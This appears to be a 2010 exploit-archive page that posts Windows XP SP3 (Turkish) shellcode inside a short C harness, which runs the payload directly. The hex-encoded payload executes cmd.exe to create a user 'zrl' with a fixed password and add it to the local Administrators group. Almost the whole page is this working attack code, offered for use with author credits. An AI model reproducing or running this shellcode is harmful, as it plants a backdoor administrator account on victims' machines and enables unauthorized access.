<html><head><title>Windows - sp3 (Tr) Add Admin Account Shellcode - 127 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
# Title        : win32/xp sp3 (Tr) Add Admin Account Shellcode 127 bytes
# Proof        : http://img823.imageshack.us/img823/1017/addqx.jpg
# Desc.        : usr: zrl , pass: 123456 , localgroup: Administrator
# Author       : ZoRLu / http://inj3ct0r.com/author/577
# mail-msn     : admin@yildirimordulari.com
# Home         : http://z0rlu.blogspot.com
# Date         : 17/09/2010
# Tesekkur     : inj3ct0r.com, r0073r, Dr.Ly0n, LifeSteaLeR, Heart_Hunter, Cyber-Zone, Stack, AlpHaNiX, ThE g0bL!N
# Lakirdi      : off ulan off  /  http://www.youtube.com/watch?v=GbyF62skA-c


#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
 
int main(){
    
    unsigned char shellcode[]=
    &quot;\xeb\x1b\x5b\x31\xc0\x50\x31\xc0\x88\x43\x5d\x53\xbb\xad\x23\x86\x7c&quot;
    &quot;\xff\xd3\x31\xc0\x50\xbb\xfa\xca\x81\x7c\xff\xd3\xe8\xe0\xff\xff\xff&quot;
    &quot;\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x6e\x65\x74\x20\x75\x73&quot;
    &quot;\x65\x72\x20\x7a\x72\x6c\x20\x31\x32\x33\x34\x35\x36\x20\x2f\x61\x64&quot;
    &quot;\x64\x20\x26\x26\x20\x6e\x65\x74\x20\x6c\x6f\x63\x61\x6c\x67\x72\x6f&quot;
    &quot;\x75\x70\x20\x41\x64\x6d\x69\x6e\x69\x73\x74\x72\x61\x74\x6f\x72\x73&quot;
    &quot;\x20\x2f\x61\x64\x64\x20\x7a\x72\x6c\x20\x26\x26\x20\x6e\x65\x74\x20&quot;
    &quot;\x75\x73\x65\x72\x20\x7a\x72\x6c&quot;;
 
    printf(&quot;Size = %d bytes\n&quot;, strlen(shellcode));
 
    ((void (*)())shellcode)();
    
    
 
    return 0;
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
